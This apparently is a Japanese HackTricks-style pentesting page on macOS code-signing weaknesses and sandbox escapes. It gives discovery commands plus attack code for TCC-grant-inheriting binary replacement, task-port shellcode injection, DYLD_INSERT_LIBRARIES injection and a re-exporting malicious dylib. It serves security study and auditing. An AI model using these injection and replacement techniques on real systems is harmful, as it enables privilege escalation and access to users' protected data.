# macOS Code Signing の弱点と Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### 基本情報

**Ad-hoc signing** (`CS_ADHOC`) は、**certificate chain がない** code signature を作成します。これは developer identity verification のない code の hash です。そのため、binary の origin を developer や organization まで追跡できません。

Apple Silicon Mac では、すべての executable に最低限 ad-hoc signature が必要です。そのため、多くの development tools、Homebrew packages、third-party utilities に ad-hoc signature が存在します。

### これが重要な理由

- **検証可能な identity がない** — identity-based checks による検出なしに binary を置き換えられる
- **privileged positions**（FDA、daemon、helpers）にある third-party ad-hoc binaries は優先度の高い target
- 一部の configuration では、ad-hoc signatures は developer-signed code ほど厳格に **verification されない** 可能性がある
- **TCC grants** を持つ ad-hoc signed binaries は特に価値が高い — binary の内容が変更されても grants は保持される（TCC が grant をどのように keying したかによる）

### Discovery
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### 攻撃: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## デバッグ可能なプロセス（get-task-allow）

### 基本情報

**`com.apple.security.get-task-allow`** entitlement（または **`CS_GET_TASK_ALLOW`** flag）を使用すると、**任意のプロセスがデバッガとしてアタッチ**し、メモリの読み取り、レジスタの変更、コードのインジェクション、実行の制御を行えます。

これは**開発ビルドのみ**を対象としています。しかし、一部のサードパーティ製バイナリには、この entitlement が本番環境でも含まれています。

> [!CAUTION]
> `get-task-allow` を持つ本番バイナリは、**即座に悪用可能なプリミティブ**です。任意のローカルプロセスが `task_for_pid()` を呼び出して対象の Mach task port を取得し、対象の entitlement、TCC grant、セキュリティコンテキストで実行される任意のコードをインジェクトできます。

### 検出
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### 攻撃: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## No Library Validation + DYLD Environment

### 致命的な組み合わせ

バイナリに以下の**両方**がある場合:
- `com.apple.security.cs.disable-library-validation` (任意の dylib をロード)
- `com.apple.security.cs.allow-dyld-environment-variables` (DYLD env vars を受け入れる)

これは**確実な code injection primitive**です — `DYLD_INSERT_LIBRARIES` が完全に機能します。

### Discovery
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### 攻撃: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox の一時的な例外

### Sandbox を弱体化させる仕組み

Sandbox の一時的な例外（`com.apple.security.temporary-exception.*`）は、App Sandbox に抜け道を作ります。

| 例外 | 許可される操作 |
|---|---|
| `temporary-exception.mach-lookup.global-name` | システム全体の XPC/Mach サービスへの接続 |
| `temporary-exception.files.absolute-path.read-write` | app container 外部のファイルの読み書き |
| `temporary-exception.iokit-user-client-class` | IOKit user-client 接続のオープン |
| `temporary-exception.shared-preference.read-only` | 他の app の preferences の読み取り |
| `temporary-exception.files.home-relative-path.read-write` | `~` を基準とするパスへのアクセス |

### Mach-Lookup 例外 = Sandbox Escape のプリミティブ

最も危険な例外は **mach-lookup** です。これにより、sandbox 化された app が privileged daemon と通信できます:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### 攻撃: Mach-Lookup による Sandbox Escape
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Private Apple Entitlements

### 概要

`com.apple.private.*` をプレフィックスとする Entitlements は、第三者向けにドキュメント化または公開されていない **Apple 内部 API** へのアクセスを提供します。Private Entitlements を持つ第三者バイナリは、enterprise cert、MDM、または App Store 外の配布を通じて取得されます。

### 危険な Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | TCC database の完全な read/write |
| `com.apple.private.tcc.allow` | 特定の TCC services へのアクセス |
| `com.apple.private.security.no-sandbox` | sandbox なしで実行 |
| `com.apple.private.iokit` | IOKit driver への直接アクセス |
| `com.apple.private.kernel.\*` | Kernel interface へのアクセス |
| `com.apple.private.xpc.launchd.job-label` | launchd jobs の登録・管理 |
| `com.apple.rootless.install` | SIP で保護された paths への書き込み |

### Discovery
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Custom Sandbox Profiles (SBPL)

### その概要

バイナリには、SBPL（Seatbelt Profile Language）で記述された **custom sandbox profiles** を同梱できます。これらのプロファイルは、デフォルトの App Sandbox よりも制限が厳しい場合もあれば、**より許容的** な場合もあります。

### Custom Profiles の監査
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## 書き込み可能なLibrary Path

### その概要

binaryが、現在のユーザーが**書き込み可能**なpathからdynamic libraryを読み込む場合、そのlibraryを悪意のあるcodeに置き換えられます。

### 発見
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### 攻撃: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## 参考資料

- [1] [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h`（`CS_OPS_*` operations and `CLEAR_LV_ENTITLEMENT`）](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c`（`csops` / `CS_OPS_CLEAR_LV` handler）](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)

{{#include ../../../banners/hacktricks-training.md}}
